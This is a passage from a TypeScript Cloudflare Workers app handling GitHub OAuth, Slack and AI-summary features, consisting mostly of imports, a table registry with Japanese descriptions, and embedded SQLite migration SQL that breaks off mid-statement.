/**
 * Cloudflare Workers GitHub OAuth
 * GitHub OAuthとJWT認証の実装
 */

import { Hono } from 'hono';
import { cors } from 'hono/cors';
import { createJWT, JWTPayload } from './utils/jwt';
// NOTE: レートリミットはCloudflare WAFのRate Limiting Rulesで設定することを推奨します
// Cloudflare Workersはステートレスなため、アプリ内でのレートリミットには
// Durable ObjectsやKVなどの外部ストアが必要です
import { authMiddleware, optionalAuthMiddleware } from './middleware/auth';
import { getLoginPage } from './views/login';
import { getWelcomePage } from './views/welcome';
import { getAiChatPage } from './views/aichat';
import { getAiChatSharePage, getAiChatShareNotFoundPage } from './views/aichat-share';
import { getSettingsPage } from './views/settings';
import { getRepositoriesPage } from './views/repositories';
import { getUserInfoPage } from './views/userinfo';
import { getMarkdownPreviewPage } from './views/markdown-preview';
import { getCacheStatusPage, CacheStatusData, TableStatusEntry, UserContextInfo, RepoColorEntry, RepoGroupEntry } from './views/status';
import { renderColumnStatsHtml } from './views/columnStats';
import { getFunctionChangelogPage, type FunctionChangeRow } from './views/functionChangelog';

import { computeColumnRelationStats, verifyColumnStats, type TableSchema, type Relation } from './utils/columnRelationStats';
import { ensureDefaultWorkspace, getCurrentWorkspace, getUserWorkspaces, switchWorkspace } from './utils/workspace';
import { getGitHubAccessToken, getGitHubLatestCommit, getGitHubCommitCount, getGitHubCommits, getGitHubCommitsForStats, computeCommitStats, getGitHubRepoOpenIssuesCount, getGitHubRepoCommitsByMonth, getGitHubRepoCommitsByDate, getGitHubRepoInfo, getGitHubTokenScopes, getGitHubUser, getGitHubUserEmail, getGitHubUserRepos, createGitHubRepo, GitHubTokenScopesError, buildRepoInstallationPermissionsMap, RepoInstallationPermissions, getGitHubUserInstallationsWithDiag, getGitHubInstallationRepos, getExternalServiceLinkedRepos, getSlackLinkedReposByWebhooks, sumCountsTotal, buildPastMonthRange, CommitDetail, toClientCommit } from './utils/github';
import { getCookieValue, getCookieValues } from './utils/cookie';
import { verifyResendWebhookSignature } from './utils/resendWebhook';
import { verifyGitHubWebhookSignature } from './utils/githubWebhook';
import { postSlackMessage, openSlackModal, respondToInteraction } from './utils/slack';
import { fetchPrDiff, runSummaryPipeline, buildSlackMessage, buildSummaryModal, buildSummaryFallbackBlocks, classifySummaryResult, resolveAiModel, extractDesignDiff, sanitizeBoxDrawing, detectCommitAgentFromText, detectCommitAgentFromPrText, describeModelSwitch, WORKER_BASE_URL, DESIGN_SPEC_CHECKLIST, DEFAULT_AI_MODEL, FALLBACK_AI_MODEL, type SummaryModalRow } from './utils/aiSummary';
import { getSessionDurationSeconds, renewSession } from './utils/session';
import { buildCommitAgentLogEntry } from './utils/commitAgentLog';
import { verifySlackSignature } from './utils/slackSignature';
import { handleSlackInteraction } from './utils/slackInteraction';
import { executeCreateRepo } from './utils/repoValidation';
import { validateReturnTo } from './utils/returnTo';
import * as logger from './utils/logger';
import { resolveIdleTimeoutSeconds, type Bindings, type Variables, type GitHubWebhookInstallationPayload, type GitHubWebhookRepositoryPayload, type GitHubWebhookPullRequestPayload, type ResendWebhookPayload } from './types';
import { withAiTimeout, AI_CLASSIFY_TIMEOUT_MS } from './utils/aiTimeout';
import { computeConversationHash, computeQuestionHash } from './utils/conversationHash';
import { buildAiMessages, ALLOWED_MODES, type SystemPromptMode } from './utils/buildAiMessages';
import { stripThinkTags } from './utils/stripThinkTags';
import { AICHAT_MODEL_MAX_TOKENS, getModelRunParams } from './utils/aichatModelConfig';

const app = new Hono<{ Bindings: Bindings; Variables: Variables }>();

const resendWebhookDedupCache = new Map<string, number>();
const DEFAULT_TIMEZONE = 'JST';
const DEFAULT_COMMIT_HISTORY_PAGE_SIZE = 10;
const STATUS_TABLE_PREVIEW_LIMIT = 20;

type SyncPolicy = 'auto' | 'manual' | 'readonly';

type StatusTableDefinition = {
  name: string;
  migration: string;
  description: string;
  syncPolicy: SyncPolicy;
};

type StatusQueryExample = {
  sql: string;
  params: string[];
  note: string;
};

const STATUS_TABLE_DEFINITIONS: StatusTableDefinition[] = [
  { name: 'user_sessions', migration: '0001', description: 'ユーザーセッション・設定', syncPolicy: 'auto' },
  { name: 'installation_permissions', migration: '0004', description: 'GitHub App インストール権限キャッシュ', syncPolicy: 'readonly' },
  { name: 'commit_calendar_cache', migration: '0005', description: 'コミットカレンダーキャッシュ', syncPolicy: 'auto' },
  { name: 'teams', migration: '0007', description: 'チーム管理', syncPolicy: 'auto' },
  { name: 'workspaces', migration: '0007', description: 'ワークスペース管理', syncPolicy: 'auto' },
  { name: 'team_members', migration: '0007', description: 'チームメンバー', syncPolicy: 'auto' },
  { name: 'commit_list_cache', migration: '0008', description: 'コミット一覧キャッシュ', syncPolicy: 'auto' },
  { name: 'cache_stats', migration: '0009', description: 'キャッシュ統計', syncPolicy: 'auto' },
  { name: 'cloudflare_setup_pending', migration: '0010', description: 'Cloudflare セットアップ通知', syncPolicy: 'auto' },
  { name: 'commit_search_history', migration: '0011', description: 'コミット検索履歴', syncPolicy: 'auto' },
  { name: 'commit_search_repo_stats', migration: '0011', description: 'コミット検索リポジトリ別集計', syncPolicy: 'auto' },
  { name: 'commit_search_hit_details', migration: '0032', description: 'コミット検索ヒット詳細（コミット単位）', syncPolicy: 'auto' },
  { name: 'commit_search_keyword_labels', migration: '0035', description: '検索キーワードラベル分類', syncPolicy: 'auto' },
  { name: 'ai_summary_log', migration: '0012', description: 'AI要約ログ', syncPolicy: 'auto' },
  { name: 'repo_color_settings', migration: '0013', description: 'リポジトリ色・タグ設定', syncPolicy: 'auto' },
  { name: 'repo_groups', migration: '0014', description: 'リポジトリグループ', syncPolicy: 'manual' },
  { name: 'repo_group_members', migration: '0014', description: 'リポジトリグループメンバー', syncPolicy: 'manual' },
  { name: 'ai_summary_reviews', migration: '0016', description: 'AI要約レビュー・評価', syncPolicy: 'manual' },
  { name: 'resend_webhook_sources', migration: '0017', description: 'Resend Webhook 送信元定義', syncPolicy: 'manual' },
  { name: 'email_send_log', migration: '0018', description: 'メール送信ログ', syncPolicy: 'auto' },
  { name: 'resend_webhook_log', migration: '0019', description: 'Resend Webhook 受信ログ', syncPolicy: 'auto' },
  { name: 'email_suppression_list', migration: '0020', description: 'メール配信停止リスト', syncPolicy: 'auto' },
  { name: 'email_mfa_challenges', migration: '0021', description: 'メールMFA認証チャレンジ', syncPolicy: 'auto' },
  { name: 'email_audit_anomalies', migration: '0022', description: 'メール監査異常検知', syncPolicy: 'auto' },
  { name: 'slack_interaction_log', migration: '0024', description: 'Slack操作ログ', syncPolicy: 'auto' },
  { name: 'commit_agent_log', migration: '0025', description: 'コミットエージェント検出ログ', syncPolicy: 'auto' },
  { name: 'table_catalog', migration: '0026', description: 'テーブルカタログ（グループ・メタ情報）', syncPolicy: 'manual' },
  { name: 'table_column_keys', migration: '0026', description: 'カラムキー定義（PK/FK）', syncPolicy: 'manual' },
  { name: 'group_oauth_apps', migration: '0027', description: 'グループ別OAuth App認可状況', syncPolicy: 'manual' },
  { name: 'ai_summary_link_access_log', migration: '0029', description: 'AI要約リンクアクセス監査ログ', syncPolicy: 'auto' },
  { name: 'commit_stats_cache', migration: '0030', description: 'コミット統計キャッシュ', syncPolicy: 'auto' },
  { name: 'column_concepts', migration: 'unknown', description: 'カラム概念定義（未分類テーブル）', syncPolicy: 'manual' },
  { name: 'repo_cache', migration: 'unknown', description: 'リポジトリキャッシュ（未分類テーブル）', syncPolicy: 'manual' },
  { name: 'user_cache', migration: 'unknown', description: 'ユーザーキャッシュ（未分類テーブル）', syncPolicy: 'manual' },
  { name: 'repo_commit_index', migration: '0034', description: 'コミットインデックス（コミットハッシュ・順番・PR番号）', syncPolicy: 'manual' },
  { name: 'ai_chat_shares', migration: '0036', description: 'AIチャット共有Q&Aレコード', syncPolicy: 'auto' },
  { name: 'keyword_category_groups', migration: '0037', description: '検索キーワードカテゴリグループ定義', syncPolicy: 'auto' },
  { name: 'keyword_multi_labels', migration: '0039', description: 'キーワードの複数カテゴリ分類', syncPolicy: 'auto' },
  { name: 'aichat_search_log', migration: '0040', description: 'AIチャット検索キーワード選択ログ（集計）', syncPolicy: 'auto' },
  { name: 'aichat_search_history', migration: '0041', description: 'AIチャット検索キーワード選択履歴（明細）', syncPolicy: 'auto' },
  { name: 'aichat_search_impressions', migration: '0044', description: 'AIチャット検索露出ログ（検索結果全件）', syncPolicy: 'auto' },
  { name: 'aichat_subqueries', migration: '0045', description: 'AIチャットサブクエリマスタ', syncPolicy: 'manual' },
  { name: 'aichat_share_subquery_links', migration: '0046', description: 'AIチャット共有質問×サブクエリリンク', syncPolicy: 'auto' },
  { name: 'aichat_model_colors', migration: '0048', description: 'AIチャットモデルカラー設定', syncPolicy: 'manual' },
  { name: 'ts_repository',           migration: 'ts-catalog', description: '関数カタログ: リポジトリ一覧',             syncPolicy: 'manual' },
  { name: 'ts_function_catalog',     migration: 'ts-catalog', description: '関数カタログ: 関数定義一覧',               syncPolicy: 'manual' },
  { name: 'ts_commit_log',           migration: 'ts-catalog', description: '関数カタログ: コミット履歴',               syncPolicy: 'manual' },
  { name: 'ts_commit_function_map',  migration: 'ts-catalog', description: '関数カタログ: コミット×関数マッピング',    syncPolicy: 'manual' },
  { name: 'ts_function_impact',      migration: 'ts-catalog', description: '関数カタログ: 変更インパクト評価',         syncPolicy: 'manual' },
  { name: 'ts_commit_quality',       migration: 'ts-catalog', description: '関数カタログ: コミット品質評価',           syncPolicy: 'manual' },
];

const REQUIRED_STATUS_TABLE_DEFINITIONS: StatusTableDefinition[] = [
  { name: 'commit_agent_log', migration: '0025', description: 'コミットエージェント検出ログ', syncPolicy: 'auto' },
];

const STATUS_MIGRATION_SQL: Record<string, string> = {
  '0001': `-- ユーザーセッション情報テーブル
CREATE TABLE IF NOT EXISTS user_sessions (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  user_id TEXT NOT NULL UNIQUE,
  timezone TEXT DEFAULT 'JST',
  session_duration TEXT DEFAULT '1h',
  last_login_at TEXT,
  current_login_at TEXT NOT NULL,
  updated_at TEXT NOT NULL
);

-- user_idにインデックスを作成（検索の高速化）
CREATE INDEX IF NOT EXISTS idx_user_id ON user_sessions(user_id);`,
  '0004': `-- GitHub App インストール権限をリポジトリ単位で保存
CREATE TABLE IF NOT EXISTS installation_permissions (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  installation_id INTEGER NOT NULL,
  repo_name TEXT,
  repository_selection TEXT NOT NULL DEFAULT 'selected',
  permissions TEXT NOT NULL DEFAULT '{}',
  updated_at TEXT NOT NULL
);

CREATE UNIQUE INDEX IF NOT EXISTS idx_install_perm_repo
  ON installation_permissions (installation_id, repo_name);

CREATE INDEX IF NOT EXISTS idx_install_perm_updated
  ON installation_permissions (updated_at);`,
  '0005': `-- コミットカレンダーのキャッシュテーブル
-- 過去の確定月のコミット数データをキャッシュし、GitHub APIへの連続アクセスを防止する
CREATE TABLE IF NOT EXISTS commit_calendar_cache (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  owner TEXT NOT NULL,
  repo TEXT NOT NULL,
  year INTEGER NOT NULL,
  month INTEGER NOT NULL,
  counts TEXT NOT NULL DEFAULT '{}',
  cached_at TEXT NOT NULL
);

CREATE UNIQUE INDEX idx_commit_calendar_owner_repo_ym
  ON commit_calendar_cache (owner, repo, year, month);`,
  '0007': `-- チーム・ワークスペースによるネームスペース分離
-- 1人チームであっても必ずチーム→ワークスペースの階層でデータを分離する

-- チーム
CREATE TABLE IF NOT EXISTS teams (
  id TEXT PRIMARY KEY,
  name TEXT NOT NULL,
  created_at TEXT NOT NULL
);

-- ワークスペース（チームに属する）
CREATE TABLE IF NOT EXISTS workspaces (
  id TEXT PRIMARY KEY,
  team_id TEXT NOT NULL,
  name TEXT NOT NULL,
  created_at TEXT NOT NULL,
  FOREIGN KEY (team_id) REFERENCES teams(id)
);

CREATE INDEX IF NOT EXISTS idx_workspaces_team ON workspaces (team_id);

-- チームメンバー
CREATE TABLE IF NOT EXISTS team_members (
  team_id TEXT NOT NULL,
  user_id TEXT NOT NULL,
  role TEXT NOT NULL DEFAULT 'member',
  joined_at TEXT NOT NULL,
  PRIMARY KEY (team_id, user_id),
  FOREIGN KEY (team_id) REFERENCES teams(id)
);

-- user_sessions に現在のワークスペースIDを追加
ALTER TABLE user_sessions ADD COLUMN current_workspace_id TEXT;

-- commit_calendar_cache: user_id → workspace_id に移行
-- 0006 で追加した user_id は空文字のままなので workspace_id に置き換える
ALTER TABLE commit_calendar_cache ADD COLUMN workspace_id TEXT NOT NULL DEFAULT '';

-- 既存の user_id ベースのインデックスを削除し workspace_id ベースに置き換え
DROP INDEX IF EXISTS idx_commit_calendar_user_owner_repo_ym;

CREATE UNIQUE INDEX idx_commit_calendar_ws_owner_repo_ym
  ON commit_calendar_cache (workspace_id, owner, repo, year, month);`,
  '0008': `-- コミット一覧のキャッシュテーブル
-- 過去の確定日(アクセス当日以外)のコミット詳細データをキャッシュし、GitHub APIへのアクセスを削減する
CREATE TABLE IF NOT EXISTS commit_list_cache (
  workspace_id TEXT NOT NULL,
  owner TEXT NOT NULL,
  repo TEXT NOT NULL,
  date TEXT NOT NULL,
  commits_json TEXT NOT NULL DEFAULT '[]',
  commit_count INTEGER NOT NULL DEFAULT 0,
  cached_at TEXT NOT NULL
);

CREATE UNIQUE INDEX IF NOT EXISTS idx_commit_list_ws_owner_repo_date
  ON commit_list_cache (workspace_id, owner, repo, date);`,
  '0009': `-- ユーザー別キャッシュ統計テーブル
-- コミット一覧のキャッシュヒット率を計算するための累計カウンターを保持する
-- 各カウンターは毎回のアクセス時に加算され、永続的に蓄積される
CREATE TABLE IF NOT EXISTS cache_stats (
  user_id TEXT NOT NULL,
  owner TEXT NOT NULL,
  repo TEXT NOT NULL,
  github_fetch_count INTEGER NOT NULL DEFAULT 0,
  cache_save_count INTEGER NOT NULL DEFAULT 0,
  cache_lookup_count INTEGER NOT NULL DEFAULT 0,
  cache_hit_count INTEGER NOT NULL DEFAULT 0,
  last_updated_at TEXT NOT NULL
);

CREATE UNIQUE INDEX IF NOT EXISTS idx_cache_stats_user_repo
  ON cache_stats (user_id, owner, repo);`,
  '0010': `-- Cloudflare 未連携リポジトリのセットアップ通知テーブル
CREATE TABLE IF NOT EXISTS cloudflare_setup_pending (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  user_id TEXT NOT NULL,
  repo_owner TEXT NOT NULL,
  repo_name TEXT NOT NULL,
  repo_full_name TEXT NOT NULL,
  is_private INTEGER NOT NULL DEFAULT 0,
  created_at TEXT NOT NULL,
  dismissed_at TEXT,
  UNIQUE(user_id, repo_full_name)
);

CREATE INDEX IF NOT EXISTS idx_cloudflare_setup_pending_user
  ON cloudflare_setup_pending(user_id, dismissed_at);`,
  '0011': `-- コミット検索履歴テーブル（テーブルA）
CREATE TABLE IF NOT EXISTS commit_search_history (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  user_id TEXT NOT NULL,
  search_query TEXT NOT NULL,
  total_hits INTEGER NOT NULL DEFAULT 0,
  repo_names TEXT NOT NULL DEFAULT '[]',
  searched_at TEXT NOT NULL
);

CREATE INDEX IF NOT EXISTS idx_commit_search_history_user_id ON commit_search_history(user_id);
CREATE INDEX IF NOT EXISTS idx_commit_search_history_total_hits ON commit_search_history(user_id, total_hits DESC);

-- コミット検索リポジトリ別集計テーブル（テーブルB）
CREATE TABLE IF NOT EXISTS commit_search_repo_stats (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  search_history_id INTEGER NOT NULL,
  repo_name TEXT NOT NULL,
  hit_count INTEGER NOT NULL DEFAULT 0,
  search_query TEXT NOT NULL,
  user_name TEXT NOT NULL,
  FOREIGN KEY (search_history_id) REFERENCES commit_search_history(id) ON DELETE CASCADE
);

CREATE INDEX IF NOT EXISTS idx_commit_search_repo_stats_history_id ON commit_search_repo_stats(search_history_id);`,
  '0012': `CREATE TABLE IF NOT EXISTS ai_summary_log (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  request_id TEXT NOT NULL UNIQUE,
  daily_seq INTEGER NOT NULL,
  event_date TEXT NOT NULL,
  event_type TEXT NOT NULL DEFAULT 'pr_summary',
  repo_full_name TEXT,
  pr_number INTEGER,
  pr_action TEXT,
  pr_url TEXT,
  model TEXT,
  summary TEXT,
  diff_length INTEGER DEFAULT 0,
  slack_notified INTEGER DEFAULT 0,
  created_at TEXT NOT NULL
);

CREATE INDEX IF NOT EXISTS idx_ai_summary_log_date ON ai_summary_log (event_date);`,
  '0013': `CREATE TABLE IF NOT EXISTS repo_color_settings (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  workspace_id TEXT NOT NULL DEFAULT '',
  repo_name TEXT NOT NULL,
  color_code TEXT NOT NULL DEFAULT '#667eea',
  display_order INTEGER NOT NULL DEFAULT 0,
  tags TEXT NOT NULL DEFAULT '',
  is_visible INTEGER NOT NULL DEFAULT 1,
  created_at TEXT NOT NULL,
  updated_at TEXT NOT NULL
);

CREATE UNIQUE INDEX IF NOT EXISTS idx_repo_color_ws_repo
  ON repo_color_settings (workspace_id, repo_name);

CREATE INDEX IF NOT EXISTS idx_repo_color_order
  ON repo_color_settings (workspace_id, display_order);`,
  '0014': `CREATE TABLE IF NOT EXISTS repo_groups (
  id TEXT PRIMARY KEY,
  workspace_id TEXT NOT NULL DEFAULT '',
  name TEXT NOT NULL,
  description TEXT NOT NULL DEFAULT '',
  color_code TEXT NOT NULL DEFAULT '#667eea',
  icon TEXT NOT NULL DEFAULT '',
  slack_channel_id TEXT NOT NULL DEFAULT '',
  display_order INTEGER NOT NULL DEFAULT 0,
  created_at TEXT NOT NULL,
  updated_at TEXT NOT NULL
);

CREATE INDEX IF NOT EXISTS idx_repo_groups_ws
  ON repo_groups (workspace_id, display_order);

CREATE TABLE IF NOT EXISTS repo_group_members (
  group_id TEXT NOT NULL,
  repo_name TEXT NOT NULL,
  workspace_id TEXT NOT NULL DEFAULT '',
  added_at TEXT NOT NULL,
  PRIMARY KEY (group_id, repo_name),
  FOREIGN KEY (group_id) REFERENCES repo_groups(id) ON DELETE CASCADE
);

CREATE INDEX IF NOT EXISTS idx_repo_group_members_repo
  ON repo_group_members (workspace_id, repo_name);`,
  '0015': `ALTER TABLE ai_summary_log ADD COLUMN resolved INTEGER NOT NULL DEFAULT 0;
ALTER TABLE ai_summary_log ADD COLUMN resolved_at TEXT;
ALTER TABLE ai_summary_log ADD COLUMN resolution_note TEXT;
ALTER TABLE ai_summary_log ADD COLUMN view_count INTEGER NOT NULL DEFAULT 0;
ALTER TABLE ai_summary_log ADD COLUMN parent_id TEXT;
ALTER TABLE ai_summary_log ADD COLUMN tags TEXT NOT NULL DEFAULT '';`,
  '0016': `CREATE TABLE IF NOT EXISTS ai_summary_reviews (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  summary_request_id TEXT NOT NULL,
  rating TEXT NOT NULL,
  reviewer_type TEXT NOT NULL DEFAULT 'human',
  reviewer_name TEXT,
  review_model TEXT,
  comment TEXT,
  created_at TEXT NOT NULL,
  FOREIGN KEY (summary_request_id) REFERENCES ai_summary_log(request_id) ON DELETE CASCADE
);

CREATE INDEX IF NOT EXISTS idx_ai_summary_reviews_request_id
  ON ai_summary_reviews (summary_request_id);

CREATE INDEX IF NOT EXISTS idx_ai_summary_reviews_rating
  ON ai_summary_reviews (rating);`,
  '0017': `CREATE TABLE IF NOT EXISTS resend_webhook_sources (
  id TEXT PRIMARY KEY,
  label TEXT NOT NULL,
  resend_account_id TEXT,
  svix_endpoint_id TEXT,
  created_at TEXT NOT NULL DEFAULT (datetime('now'))
);`,
  '0018': `CREATE TABLE IF NOT EXISTS email_send_log (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  source_id TEXT,
  resend_email_id TEXT,
  email_to TEXT NOT NULL,
  email_type TEXT NOT NULL,
  reference_id TEXT,
  created_at TEXT NOT NULL DEFAULT (datetime('now')),
  FOREIGN KEY (source_id) REFERENCES resend_webhook_sources(id)
);

CREATE INDEX IF NOT EXISTS idx_email_send_log_resend_email_id ON email_send_log(resend_email_id);
CREATE INDEX IF NOT EXISTS idx_email_send_log_source_id ON email_send_log(source_id);
CREATE INDEX IF NOT EXISTS idx_email_send_log_email_type ON email_send_log(email_type);`,
  '0019': `CREATE TABLE IF NOT EXISTS resend_webhook_log (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  source_id TEXT,
  svix_id TEXT NOT NULL,
  resend_email_id TEXT,
  event_type TEXT NOT NULL,
  email_from TEXT,
  email_to TEXT,
  bounce_type TEXT,
  error_detail TEXT,
  slack_result TEXT,
  slack_result_at TEXT,
  proxy_result TEXT,
  proxy_result_at TEXT,
  created_at TEXT NOT NULL DEFAULT (datetime('now')),
  FOREIGN KEY (source_id) REFERENCES resend_webhook_sources(id),
  UNIQUE (source_id, svix_id)
);

CREATE INDEX IF NOT EXISTS idx_resend_webhook_log_resend_email_id ON resend_webhook_log(resend_email_id);
CREATE INDEX IF NOT EXISTS idx_resend_webhook_log_event_type ON resend_webhook_log(event_type);
CREATE INDEX IF NOT EXISTS idx_resend_webhook_log_created_at ON resend_webhook_log(created_at);`,
  '0020': `CREATE TABLE IF NOT EXISTS email_suppression_list (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  email TEXT NOT NULL,
  source_id TEXT,
  reason TEXT NOT NULL,
  origin_webhook_log_id INTEGER,
  suppressed_at TEXT NOT NULL DEFAULT (datetime('now')),
  resubscribed_at TEXT,
  FOREIGN KEY (source_id) REFERENCES resend_webhook_sources(id),
  FOREIGN KEY (origin_webhook_log_id) REFERENCES resend_webhook_log(id),
  UNIQUE (email, source_id)
);

CREATE INDEX IF NOT EXISTS idx_email_suppression_list_email ON email_suppression_list(email);`,
  '0021': `CREATE TABLE IF NOT EXISTS email_mfa_challenges (
  id TEXT PRIMARY KEY,
  user_id TEXT NOT NULL,
  email TEXT NOT NULL,
  source_id TEXT,
  resend_email_id TEXT,
  code_hash TEXT NOT NULL,
  code_type TEXT NOT NULL,
  code_algorithm TEXT NOT NULL DEFAULT 'random',
  totp_period INTEGER,
  totp_counter INTEGER,
  purpose TEXT NOT NULL,
  attempts INTEGER NOT NULL DEFAULT 0,
  max_attempts INTEGER NOT NULL DEFAULT 5,
  expires_at TEXT NOT NULL,
  verified_at TEXT,
  invalidated_at TEXT,
  created_at TEXT NOT NULL DEFAULT (datetime('now')),
  FOREIGN KEY (source_id) REFERENCES resend_webhook_sources(id)
);

CREATE INDEX IF NOT EXISTS idx_email_mfa_challenges_user_id ON email_mfa_challenges(user_id);
CREATE INDEX IF NOT EXISTS idx_email_mfa_challenges_resend_email_id ON email_mfa_challenges(resend_email_id);
CREATE INDEX IF NOT EXISTS idx_email_mfa_challenges_expires_at ON email_mfa_challenges(expires_at);`,
  '0022': `CREATE TABLE IF NOT EXISTS email_audit_anomalies (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  period_start TEXT NOT NULL,
  period_end TEXT NOT NULL,
  anomaly_type TEXT NOT NULL,
  severity TEXT NOT NULL,
  target_user_id TEXT,
  target_email TEXT,
  source_id TEXT,
  metric_value REAL NOT NULL,
  threshold_value REAL NOT NULL,
  detail TEXT,
  acknowledged_at TEXT,
  acknowledged_by TEXT,
  created_at TEXT NOT NULL DEFAULT (datetime('now')),
  FOREIGN KEY (source_id) REFERENCES resend_webhook_sources(id),
  UNIQUE (period_start, period_end, anomaly_type, target_user_id, target_email, source_id)
);

CREATE INDEX IF NOT EXISTS idx_email_audit_anomalies_anomaly_type ON email_audit_anomalies(anomaly_type);
CREATE INDEX IF NOT EXISTS idx_email_audit_anomalies_severity ON email_audit_anomalies(severity);
CREATE INDEX IF NOT EXISTS idx_email_audit_anomalies_period ON email_audit_anomalies(period_start, period_end);`,
  '0023': `ALTER TABLE resend_webhook_sources ADD COLUMN webhook_secret TEXT;
ALTER TABLE resend_webhook_log ADD COLUMN email_from TEXT;`,
  '0024': `CREATE TABLE IF NOT EXISTS slack_interaction_log (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  step TEXT NOT NULL,
  detail TEXT,
  created_at TEXT NOT NULL DEFAULT (datetime('now'))
);`,
  '0025': `CREATE TABLE IF NOT EXISTS commit_agent_log (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  request_id TEXT NOT NULL,
  repo_full_name TEXT NOT NULL,
  pr_number INTEGER NOT NULL,
  commit_sha TEXT,
  commit_message TEXT,
  commit_author_name TEXT,
  commit_author_email TEXT,
  detected_agent_name TEXT,
  detected_agent_version TEXT,
  detected_signal TEXT,
  created_at TEXT NOT NULL
);

CREATE INDEX IF NOT EXISTS idx_commit_agent_log_request ON commit_agent_log(request_id);
CREATE INDEX IF NOT EXISTS idx_commit_agent_log_repo_pr ON commit_agent_log(repo_full_name, pr_number);`,
  '0026': `CREATE TABLE IF NOT EXISTS table_catalog (
  table_name TEXT PRIMARY KEY,
  group_name TEXT NOT NULL,
  description TEXT NOT NULL,
  migration TEXT NOT NULL,
  sync_policy TEXT NOT NULL DEFAULT 'auto',
  display_order INTEGER NOT NULL DEFAULT 0
);

CREATE TABLE IF NOT EXISTS table_column_keys (
  table_name TEXT NOT NULL,
  column_name TEXT NOT NULL,
  key_type TEXT NOT NULL,
  fk_target_table TEXT,
  PRIMARY KEY (table_name, column_name),
  FOREIGN KEY (table_name) REFERENCES table_catalog(table_name)
);

CREATE INDEX IF NOT EXISTS idx_table_catalog_group ON table_catalog(group_name);
CREATE INDEX IF NOT EXISTS idx_table_column_keys_fk ON table_column_keys(fk_target_table);

ALTER TABLE table_catalog ADD COLUMN preview_sql TEXT;`,
  '0027': `CREATE TABLE IF NOT EXISTS group_oauth_apps (
  group_id TEXT NOT NULL,
  app_name TEXT NOT NULL,
  app_note TEXT NOT NULL DEFAULT '',
  workspace_id TEXT NOT NULL DEFAULT '',
  added_at TEXT NOT NULL,
  PRIMARY KEY (group_id, app_name),
  FOREIGN KEY (group_id) REFERENCES repo_groups(id) ON DELETE CASCADE
);

CREATE INDEX IF NOT EXISTS idx_group_oauth_apps_ws ON group_oauth_apps (workspace_id);`,
  '0029': `CREATE TABLE IF NOT EXISTS ai_summary_link_access_log (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  route TEXT NOT NULL,
  request_id TEXT NOT NULL,
  found INTEGER NOT NULL DEFAULT 0,
  issue_code TEXT NOT NULL DEFAULT 'unknown',
  issue_detail TEXT,
  referer TEXT,
  user_agent TEXT,
  created_at TEXT NOT NULL
);

CREATE INDEX IF NOT EXISTS idx_ai_summary_link_access_log_request ON ai_summary_link_access_log(request_id);
CREATE INDEX IF NOT EXISTS idx_ai_summary_link_access_log_created ON ai_summary_link_access_log(created_at);`,
  '0030': `CREATE TABLE IF NOT EXISTS commit_stats_cache (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  owner TEXT NOT NULL,
  repo TEXT NOT NULL,
  period TEXT NOT NULL,
  author_login TEXT NOT NULL,
  author_name TEXT,
  commit_count INTEGER NOT NULL DEFAULT 0,
  merge_count INTEGER NOT NULL DEFAULT 0,
  cached_at TEXT NOT NULL,
  UNIQUE(owner, repo, period, author_login)
);

CREATE INDEX IF NOT EXISTS idx_commit_stats_cache_repo_period ON commit_stats_cache(owner, repo, period);`,
  '0031': `ALTER TABLE commit_calendar_cache ADD COLUMN total_count INTEGER NOT NULL DEFAULT 0;
UPDATE commit_calendar_cache SET total_count = (SELECT COALESCE(SUM(CAST(je.value AS INTEGER)), 0) FROM json_each(commit_calendar_cache.counts) je) WHERE total_count = 0;`,
  '0032': `CREATE TABLE IF NOT EXISTS commit_search_hit_details (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  search_history_id INTEGER NOT NULL,
  repo_name TEXT NOT NULL,
  commit_sha TEXT NOT NULL,
  commit_message TEXT NOT NULL,
  FOREIGN KEY (search_history_id) REFERENCES commit_search_history(id) ON DELETE CASCADE
);
CREATE INDEX IF NOT EXISTS idx_commit_search_hit_details_history ON commit_search_hit_details(search_history_id);
CREATE INDEX IF NOT EXISTS idx_commit_search_hit_details_repo ON commit_search_hit_details(repo_name);
CREATE INDEX IF NOT EXISTS idx_commit_search_hit_details_sha ON commit_search_hit_details(commit_sha);`,
  '0033': `INSERT OR IGNORE INTO table_catalog (table_name, group_name, description, migration, sync_policy, display_order) VALUES
('slack_interaction_log', 'config', 'Slack操作ログ', '0024', 'auto', 0),
('commit_agent_log', 'ai', 'コミットエージェント検出ログ', '0025', 'auto', 0),
('group_oauth_apps', 'config', 'グループ別OAuth App認可状況', '0027', 'manual', 0),
('ai_summary_link_access_log', 'ai', 'AI要約リンクアクセス監査ログ', '0029', 'auto', 0),
('commit_stats_cache', 'commit', 'コミット統計キャッシュ', '0030', 'auto', 0),
('commit_search_hit_details', 'commit', 'コミット検索ヒット詳細（コミット単位）', '0032', 'auto', 0);
INSERT OR REPLACE INTO table_column_keys (table_name, column_name, key_type, fk_target_table) VALUES
('user_sessions', 'current_workspace_id', 'fk', 'workspaces'),
('team_members', 'user_id', 'pk+fk', 'user_sessions'),
('cache_stats', 'user_id', 'fk', 'user_sessions'),
('cloudflare_setup_pending', 'user_id', 'fk', 'user_sessions'),
('commit_search_history', 'user_id', 'fk', 'user_sessions'),
('commit_search_hit_details', 'search_history_id', 'fk', 'commit_search_history'),
('commit_calendar_cache', 'workspace_id', 'fk', 'workspaces'),
('commit_list_cache', 'workspace_id', 'fk', 'workspaces'),
('repo_color_settings', 'workspace_id', 'fk', 'workspaces'),
('repo_color_settings', 'repo_name', 'fk', 'installation_permissions'),
('repo_groups', 'workspace_id', 'fk', 'workspaces'),
('repo_group_members', 'workspace_id', 'fk', 'workspaces'),
('repo_group_members', 'repo_name', 'pk+fk', 'installation_permissions'),
